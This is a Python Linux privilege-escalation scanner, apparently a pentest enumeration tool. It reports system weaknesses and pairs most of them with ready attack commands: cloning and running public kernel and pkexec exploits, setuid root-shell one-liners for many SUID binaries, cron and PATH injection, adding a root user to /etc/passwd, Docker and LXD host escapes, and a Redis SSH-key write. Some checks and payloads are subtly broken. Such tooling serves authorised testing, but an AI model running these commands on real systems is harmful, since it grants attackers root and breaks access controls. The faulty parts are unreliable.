#!/usr/bin/env python3
import os
import sys
import json
import subprocess
import argparse
from pathlib import Path
from datetime import datetime

class Scanner:
    def __init__(self, mode="normal"):
        self.mode = mode
        self.findings = []
        self.start_time = datetime.now()
        timestamp = self.start_time.strftime("%Y%m%d_%H%M%S")
        self.output_dir = Path(f"/tmp/contextprivesc_{timestamp}")
        self.output_dir.mkdir(parents=True, exist_ok=True)
    
    def save_finding(self, severity, category, title, detail, mitre_id="", exploit="", cve=""):
        finding = {
            "severity": severity,
            "category": category,
            "title": title,
            "detail": detail[:500],
            "mitre_id": mitre_id,
            "exploit": exploit,
            "cve": cve,
            "timestamp": datetime.now().isoformat()
        }
        self.findings.append(finding)
        print(json.dumps(finding))
        return finding

    def run(self):
        print(json.dumps({"severity": "INFO", "title": "Scan Started", "detail": f"Mode: {self.mode}"}))
        
        # ==================== SECTION 1: SYSTEM INFORMATION ====================
        print("[INFO] Analyzing system information")
        
        # OS Detection
        if os.path.exists("/etc/os-release"):
            with open("/etc/os-release") as f:
                for line in f:
                    if line.startswith("PRETTY_NAME="):
                        os_name = line.split("=",1)[1].strip().strip('"')
                        self.save_finding("INFO", "System", f"Operating System: {os_name}", f"System is running {os_name}", "T1082")
        
        # Kernel Version
        kernel = os.uname().release
        self.save_finding("INFO", "System", f"Kernel: {kernel}", f"Kernel version {kernel}", "T1082")
        
        # CPU Info
        try:
            cpu = subprocess.run(["grep", "model name", "/proc/cpuinfo"], capture_output=True, text=True)
            if cpu.stdout:
                cpu_name = cpu.stdout.split("\n")[0].split(":",1)[-1].strip()
                print(f"[INFO] CPU: {cpu_name}")
        except: pass
        
        # Memory Info
        try:
            mem = subprocess.run(["free", "-h"], capture_output=True, text=True)
            print(f"[INFO] Memory:\n{mem.stdout.strip()}")
        except: pass
        
        # Disk Info
        try:
            disk = subprocess.run(["df", "-h"], capture_output=True, text=True)
            print(f"[INFO] Disk:\n{disk.stdout.strip()}")
        except: pass
        
        # Writable /tmp
        if os.access("/tmp", os.W_OK):
            self.save_finding("WARNING", "Permissions", "/tmp is world-writable", "The /tmp directory is writable by all users, enabling exploit staging", "T1036")
        
        # SELinux status
        try:
            selinux = subprocess.run(["getenforce"], capture_output=True, text=True)
            if selinux.returncode == 0 and selinux.stdout.strip() != "Enforcing":
                self.save_finding("WARNING", "Security", f"SELinux: {selinux.stdout.strip()}", "SELinux is not in enforcing mode, reducing security", "T1562")
        except: pass
        
        # ==================== SECTION 2: KERNEL EXPLOITS ====================
        print("[INFO] Scanning for kernel vulnerabilities")
        
        kernel = os.uname().release
        parts = kernel.split(".")
        
        if len(parts) >= 2:
            try:
                major = int(parts[0])
                minor = int(parts[1]) if parts[1].isdigit() else 0
                
                # DirtyCow - kernel < 4.8.3
                if major < 4 or (major == 4 and minor < 8):
                    self.save_finding("CRITICAL", "Kernel", "DirtyCow Vulnerability (CVE-2016-5195)", f"Kernel {kernel} is vulnerable to DirtyCow privilege escalation", "T1068", "git clone https://github.com/dirtycow/dirtycow.github.io && cd dirtycow.github.io && make && ./dirtycow", "CVE-2016-5195")
                
                # DirtyPipe - kernel 5.8-5.16
                if major == 5 and 8 <= minor <= 16:
                    self.save_finding("CRITICAL", "Kernel", "DirtyPipe Vulnerability (CVE-2022-0847)", f"Kernel {kernel} may be vulnerable to DirtyPipe privilege escalation", "T1068", "gcc dirtypipe.c -o dirtypipe && ./dirtypipe /etc/passwd", "CVE-2022-0847")
                
                # OverlayFS - kernel < 6.2
                if major < 6 or (major == 6 and minor < 2):
                    self.save_finding("WARNING", "Kernel", "Potential OverlayFS Vulnerability (CVE-2023-0386)", f"Kernel {kernel} may be vulnerable to OverlayFS privilege escalation", "T1068", "unshare -Urm && mount -t overlay overlay -o rw,lowerdir=l,upperdir=/tmp/diff,workdir=/tmp/worker l && touch /tmp/diff/setuid && chmod u+s /tmp/diff/setuid && umount l && /tmp/setuid su -", "CVE-2023-0386")
            except: pass
        
        # PwnKit - pkexec
        if os.path.exists("/usr/bin/pkexec") or os.path.exists("/bin/pkexec"):
            self.save_finding("WARNING", "Kernel", "PwnKit Vulnerability (CVE-2021-4034)", "pkexec found - may be vulnerable to Polkit privilege escalation", "T1068", "git clone https://github.com/berdav/CVE-2021-4034 && cd CVE-2021-4034 && make && ./cve-2021-4034", "CVE-2021-4034")
        
        # ==================== SECTION 3: SUDO PRIVILEGES ====================
        print("[INFO] Analyzing sudo privileges")
        
        try:
            result = subprocess.run(["sudo", "-l"], capture_output=True, text=True, timeout=10)
            output = result.stdout + result.stderr
            
            if "NOPASSWD" in output:
                self.save_finding("CRITICAL", "Sudo", "NOPASSWD Sudo Rules Detected", "User can execute commands with sudo without password authentication", "T1548.003", "sudo /bin/bash")
            
            if "ALL" in output and "NOPASSWD" in output:
                self.save_finding("CRITICAL", "Sudo", "Unrestricted Sudo Access (ALL:ALL NOPASSWD)", "User has ALL sudo privileges without password - immediate root access possible", "T1548.003", "sudo /bin/bash")
            
            # Check for dangerous sudo binaries
            dangerous_bins = ["bash", "sh", "python", "python3", "perl", "ruby", "vim", "vi", "nano", "less", "more", "find", "awk", "sed", "cp", "mv", "chmod", "nmap", "php", "node", "docker", "git", "tar", "make", "gcc", "strace", "gdb"]
            for binary in dangerous_bins:
                if binary in output and "NOPASSWD" in output:
                    self.save_finding("CRITICAL", "Sudo", f"Dangerous Sudo Binary: {binary}", f"The binary '{binary}' can be executed with sudo without password", "T1548.003", f"sudo {binary}")
                    break
        except: pass
        
        # Baron Samedit - CVE-2021-3156
        try:
            ver = subprocess.run(["sudo", "--version"], capture_output=True, text=True)
            if "1.8" in ver.stdout or "1.9.0" in ver.stdout or "1.9.1" in ver.stdout or "1.9.2" in ver.stdout or "1.9.3" in ver.stdout or "1.9.4" in ver.stdout:
                self.save_finding("CRITICAL", "Sudo", "Vulnerable Sudo Version - Baron Samedit (CVE-2021-3156)", "Sudo version may be vulnerable to heap-based buffer overflow privilege escalation", "T1068", "sudoedit -s / '$(python3 -c \"print(\\\"A\\\"*65536)\")'", "CVE-2021-3156")
        except: pass
        
        # ==================== SECTION 4: SUID BINARIES ====================
        print("[INFO] Scanning for SUID binaries")
        
        try:
            result = subprocess.run("find / -perm -4000 -type f 2>/dev/null | head -50", capture_output=True, text=True, shell=True, timeout=60)
            suid_files = [f for f in result.stdout.strip().split("\n") if f]
            print(f"[INFO] Found {len(suid_files)} SUID binaries")
            
            dangerous_suid = {
                "bash": "bash -p",
                "sh": "sh -p",
                "dash": "dash -p",
                "ksh": "ksh -p",
                "zsh": "zsh -p",
                "python": "python -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
                "python3": "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
                "perl": "perl -e 'use POSIX; setuid(0); exec \"/bin/bash\";'",
                "ruby": "ruby -e 'Process::Sys.setuid(0); exec \"/bin/bash\"'",
                "find": "find . -exec /bin/bash -p \\; -quit",
                "vim": "vim -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\",\"sh\")'",
                "vi": "vi -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\",\"sh\")'",
                "nano": "nano (CTRL+R, CTRL+X, reset; sh 1>&0 2>&0)",
                "less": "less /etc/passwd (then: !/bin/bash -p)",
                "more": "more /etc/passwd (then: !/bin/bash -p)",
                "awk": "awk 'BEGIN {system(\"/bin/bash -p\")}'",
                "sed": "sed -n '1e exec sh 1>&0' /etc/hosts",
                "cp": "cp /bin/bash /tmp/bash && chmod u+s /tmp/bash && /tmp/bash -p",
                "chmod": "chmod 4777 /bin/bash && /bin/bash -p",
                "nmap": "echo 'os.execute(\"/bin/sh\")' > /tmp/x.nse && nmap --script=/tmp/x.nse",
                "php": "php -r 'posix_setuid(0); system(\"/bin/bash -p\");'",
                "node": "node -e 'process.setuid(0);require(\"child_process\").spawn(\"/bin/bash\",[\"-p\"])'",
                "docker": "docker run -v /:/mnt --rm -it alpine chroot /mnt bash",
                "git": "git -p help config (then: !/bin/bash -p)",
                "tar": "tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash",
                "make": "make -s --eval='x:\\n\\t-\"/bin/bash -p\"'",
                "gcc": "gcc -wrapper /bin/bash,-p .",
                "strace": "strace -o /dev/null /bin/bash -p",
                "gdb": "gdb -q --nx -ex 'python import os;os.setuid(0)' -ex 'run /bin/bash -p'",
                "mysql": "mysql -e '\\\\! /bin/bash'",
                "psql": "psql -c '\\\\! /bin/bash'",
                "lua": "lua -e 'os.execute(\"/bin/bash -p\")'"
            }
            
            for suid_file in suid_files[:30]:
                binary = os.path.basename(suid_file)
                if binary in dangerous_suid:
                    self.save_finding("CRITICAL", "SUID", f"SUID Binary: {binary}", f"Dangerous SUID binary found at {suid_file}", "T1548.001", dangerous_suid[binary])
        except: pass
        
        # ==================== SECTION 5: CRON JOBS ====================
        print("[INFO] Analyzing cron jobs")
        
        cron_dirs = ["/etc/cron.d", "/etc/cron.daily", "/etc/cron.hourly", "/etc/cron.weekly", "/etc/cron.monthly"]
        
        for cron_dir in cron_dirs:
            if os.path.exists(cron_dir):
                for cron_file in Path(cron_dir).iterdir():
                    if cron_file.is_file() and os.access(cron_file, os.W_OK):
                        self.save_finding("CRITICAL", "Cron", f"Writable Cron File: {cron_file.name}", f"Cron file at {cron_file} is world-writable - code injection possible", "T1053.003", f"echo '* * * * * root cp /bin/bash /tmp/bash && chmod u+s /tmp/bash' >> {cron_file}")
        
        if os.path.exists("/etc/crontab"):
            if os.access("/etc/crontab", os.W_OK):
                self.save_finding("CRITICAL", "Cron", "Writable System Crontab", "/etc/crontab is writable - can inject malicious scheduled jobs", "T1053.003", "echo '* * * * * root cp /bin/bash /tmp/bash && chmod u+s /tmp/bash' >> /etc/crontab")
            
            # Check for writable scripts in crontab
            try:
                with open("/etc/crontab") as f:
                    content = f.read()
                    import re
                    scripts = re.findall(r'[^\s]+\.(sh|py|pl|rb|php)', content)
                    for script in scripts[:10]:
                        if os.path.exists(script) and os.access(script, os.W_OK):
                            self.save_finding("CRITICAL", "Cron", f"Writable Cron Script: {script}", f"Script {script} is called by cron and is writable", "T1053.003", f"echo 'cp /bin/bash /tmp/bash && chmod u+s /tmp/bash' >> {script}")
            except: pass
        
        # ==================== SECTION 6: FILE PERMISSIONS ====================
        print("[INFO] Checking sensitive file permissions")
        
        # Critical files
        if os.path.exists("/etc/shadow"):
            if os.access("/etc/shadow", os.R_OK):
                self.save_finding("CRITICAL", "Files", "/etc/shadow is readable", "Password hashes in /etc/shadow are readable - local cracking possible", "T1003.008", "hashcat -m 1800 shadow_hashes.txt /usr/share/wordlists/rockyou.txt")
            if os.access("/etc/shadow", os.W_OK):
                self.save_finding("CRITICAL", "Files", "/etc/shadow is writable", "Can modify password hashes", "T1222")
        
        if os.path.exists("/etc/passwd"):
            if os.access("/etc/passwd", os.R_OK):
                self.save_finding("INFO", "Files", "/etc/passwd readable", f"Found {len(open('/etc/passwd').readlines())} users", "T1083")
            if os.access("/etc/passwd", os.W_OK):
                self.save_finding("CRITICAL", "Files", "/etc/passwd is writable", "/etc/passwd is writable - can add new root user", "T1098", "echo 'hacker:$(openssl passwd -1 pass123):0:0::/root:/bin/bash' >> /etc/passwd")
        
        if os.path.exists("/etc/sudoers"):
            if os.access("/etc/sudoers", os.R_OK):
                self.save_finding("WARNING", "Files", "/etc/sudoers readable", "Sudo configuration is readable - may expose privilege escalation paths", "T1083")
        
        # Root directory
        if os.path.exists("/root"):
            if os.access("/root", os.R_OK):
                self.save_finding("CRITICAL", "Files", "/root directory is readable", "Root's home directory is readable - may contain sensitive files", "T1083", "ls -la /root; cat /root/.bash_history")
            
            # Root history
            if os.path.exists("/root/.bash_history") and os.access("/root/.bash_history", os.R_OK):
                self.save_finding("CRITICAL", "Files", "Root bash history readable", "Command history of root user is accessible", "T1005", "cat /root/.bash_history")
            
            # Root SSH keys
            if os.path.exists("/root/.ssh/id_rsa") and os.access("/root/.ssh/id_rsa", os.R_OK):
                self.save_finding("CRITICAL", "Files", "Root SSH private key readable", "Root SSH private key is exposed - can authenticate to other systems", "T1552.004", "ssh -i /root/.ssh/id_rsa user@host")
        
        # World-writable /etc files
        try:
            result = subprocess.run("find /etc -writable -type f 2>/dev/null | head -20", capture_output=True, text=True, shell=True)
            for etc_file in result.stdout.strip().split("\n"):
                if etc_file and not etc_file.startswith("/proc"):
                    self.save_finding("WARNING", "Files", f"World-writable config: {os.path.basename(etc_file)}", f"Configuration file {etc_file} is world-writable", "T1222")
        except: pass
        
        # .env files with credentials
        try:
            result = subprocess.run("find /var/www /home -name '.env' -readable 2>/dev/null | head -10", capture_output=True, text=True, shell=True)
            for env_file in result.stdout.strip().split("\n"):
                if env_file:
                    self.save_finding("WARNING", "Credentials", f".env file found: {env_file}", "Environment file may contain credentials", "T1552.001", f"cat {env_file}")
        except: pass
        
        # Backup files
        try:
            result = subprocess.run("find / -name '*.bak' -o -name '*.backup' -o -name '*.old' 2>/dev/null | head -10", capture_output=True, text=True, shell=True)
            for backup in result.stdout.strip().split("\n"):
                if backup:
                    self.save_finding("INFO", "Files", f"Backup file: {os.path.basename(backup)}", f"Backup file found at {backup}", "T1083")
        except: pass
        
        # ==================== SECTION 7: CONTAINER ESCAPE ====================
        print("[INFO] Checking container escape vectors")
        
        # Docker socket
        if os.path.exists("/var/run/docker.sock"):
            self.save_finding("CRITICAL", "Container", "Docker socket is accessible", "/var/run/docker.sock is writable - can spawn privileged containers for host access", "T1611", "docker run -v /:/mnt --rm -it alpine chroot /mnt bash")
        
        # Docker group
        try:
            groups = subprocess.run(["groups"], capture_output=True, text=True)
            if "docker" in groups.stdout:
                self.save_finding("CRITICAL", "Container", "User in docker group", "Docker group membership provides root-equivalent access", "T1611", "docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash")
        except: pass
        
        # LXD group
        try:
            groups = subprocess.run(["groups"], capture_output=True, text=True)
            if "lxd" in groups.stdout:
                self.save_finding("WARNING", "Container", "User in LXD group", "LXD group membership can lead to container escape and host access", "T1611", "lxc init ubuntu:18.04 privesc -c security.privileged=true && lxc config device add privesc mydevice disk source=/ path=/mnt/root recursive=true && lxc start privesc && lxc exec privesc /bin/sh")
        except: pass
        
        # Inside container
        if os.path.exists("/.dockerenv") or os.path.exists("/.container-env"):
            self.save_finding("CRITICAL", "Container", "Running inside container", "System is running inside a container - container escape may be possible", "T1611")
        
        # CAP_SYS_ADMIN capability
        try:
            cap_eff = subprocess.run("grep CapEff /proc/self/status | awk '{print $2}'", capture_output=True, text=True, shell=True)
            if cap_eff.stdout.strip():
                cap_hex = cap_eff.stdout.strip()
                cap_dec = int(cap_hex, 16)
                if cap_dec & 2097152:  # CAP_SYS_ADMIN bit
                    self.save_finding("CRITICAL", "Container", "CAP_SYS_ADMIN capability present", "CAP_SYS_ADMIN capability enables container escape via namespace manipulation", "T1611", "mount -t cgroup -o rdma cgroup /tmp/cgroup && mkdir /tmp/cgroup/x && echo 1 > /tmp/cgroup/x/notify_on_release")
        except: pass
        
        # ==================== SECTION 8: PATH HIJACKING ====================
        print("[INFO] Checking PATH hijacking")
        
        path_dirs = os.environ.get("PATH", "").split(":")
        for path_dir in path_dirs:
            if path_dir and os.path.exists(path_dir) and os.access(path_dir, os.W_OK):
                self.save_finding("CRITICAL", "Path", f"Writable PATH directory: {path_dir}", f"Directory {path_dir} is in PATH and writable - command hijacking possible", "T1574.007", f"echo '#!/bin/bash\\ncp /bin/bash /tmp/bash && chmod u+s /tmp/bash' > {path_dir}/ls && chmod +x {path_dir}/ls")
        
        # ==================== SECTION 9: NETWORK SERVICES ====================
        print("[INFO] Analyzing network services")
        
        # Listening ports
        try:
            ss = subprocess.run(["ss", "-tlnp"], capture_output=True, text=True)
            listening = len([l for l in ss.stdout.split("\n") if "LISTEN" in l])
            print(f"[INFO] Found {listening} listening ports")
        except: pass
        
        # SSH configuration
        if os.path.exists("/etc/ssh/sshd_config"):
            with open("/etc/ssh/sshd_config") as f:
                config = f.read()
                if "PermitRootLogin yes" in config and not config.startswith("#"):
                    self.save_finding("WARNING", "Network", "SSH root login enabled", "Root can login remotely via SSH - significantly increases attack surface", "T1021.004", "ssh root@target")
                
                if "PasswordAuthentication no" not in config:
                    self.save_finding("WARNING", "Network", "SSH password authentication enabled", "SSH allows password authentication - vulnerable to brute force attacks", "T1021.004")
        
        # ==================== SECTION 10: DATABASE CREDENTIALS ====================
        print("[INFO] Checking database credentials")
        
        # MySQL no password
        try:
            mysql_test = subprocess.run(["mysql", "-u", "root", "-e", "SELECT 1"], capture_output=True, timeout=5)
            if mysql_test.returncode == 0:
                self.save_finding("CRITICAL", "Database", "MySQL root login without password", "MySQL root user has no password - can access all databases", "T1078", "mysql -u root -e 'SELECT * FROM mysql.user;'")
        except: pass
        
        # Redis no auth
        try:
            redis_test = subprocess.run(["redis-cli", "-h", "127.0.0.1", "ping"], capture_output=True, timeout=5)
            if "PONG" in redis_test.stdout:
                self.save_finding("CRITICAL", "Database", "Redis accessible without authentication", "Redis has no password - can access/modify all data", "T1078", "redis-cli CONFIG SET dir /root/.ssh && redis-cli CONFIG SET dbfilename authorized_keys")
        except: pass
        
        # ==================== SUMMARY ====================
        critical_count = len([f for f in self.findings if f["severity"] == "CRITICAL"])
        warning_count = len([f for f in self.findings if f["severity"] == "WARNING"])
        info_count = len([f for f in self.findings if f["severity"] == "INFO"])
        
        print("\n" + "="*60)
        print(f"SCAN COMPLETE - {self.mode.upper()} MODE")
        print("="*60)
        print(f"CRITICAL Findings: {critical_count}")
        print(f"WARNING Findings:  {warning_count}")
        print(f"INFO Findings:     {info_count}")
        print(f"Total Findings:    {len(self.findings)}")
        print(f"Results saved to:  {self.output_dir}")
        print("="*60)
        
        return self.findings

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--mode", "-m", choices=["quick", "normal", "full"], default="normal")
    parser.add_argument("--quick", "-q", action="store_true")
    args = parser.parse_args()
    
    mode = "quick" if args.quick else args.mode
    
    scanner = Scanner(mode=mode)
    scanner.run()

if __name__ == "__main__":
    main()
